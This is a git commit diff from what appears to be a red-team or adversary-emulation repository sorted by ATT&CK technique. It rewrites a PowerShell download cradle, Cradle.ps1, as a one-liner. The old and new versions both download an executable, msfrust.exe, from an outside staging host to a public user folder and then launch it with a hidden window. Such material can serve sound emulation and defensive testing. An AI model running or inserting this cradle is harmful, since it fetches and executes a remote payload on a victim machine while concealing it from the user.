a3d6c8a45362d440e2e8d64b6d3afd464bbabb6f
cmndcntrlcyber <r.soreng@c3s.consulting>
2024-09-23 01:51:24 -0700

    modified files

--- attcks/T1608/pwsh/Cradle.ps1
+++ attcks/T1608/pwsh/Cradle.ps1
@@ -1,11 +1,1 @@
-$client = New-Object System.Net.WebClient
-$client.Headers.Add('User-Agent', 'Stage (https://stage.attck-deploy.net/msfrust.exe)')
-$filePath = "C:\Users\public\Documents\msfrust.exe" # Change this to your desired output directory and file name
-$url = "https://stage.attck-deploy.net/msfrust.exe"
-$client.DownloadFile($url, $filePath)
-
-# Wait for the file to finish downloading before executing it
-Start-Sleep -Seconds 10
-
-# Start the process with no window in runtime
-Start-Process -FilePath $filePath -WindowStyle Hidden
+$client = New-Object System.Net.WebClient; $client.Headers.Add('User-Agent', 'Stage (https://stage.attck-deploy.net/msfrust.exe)'); $filePath = "C:\Users\public\msfrust.exe"; $url = "https://stage.attck-deploy.net/msfrust.exe"; $client.DownloadFile($url, $filePath); Start-Sleep -Seconds 10; Start-Process -FilePath $filePath -WindowStyle Hidden
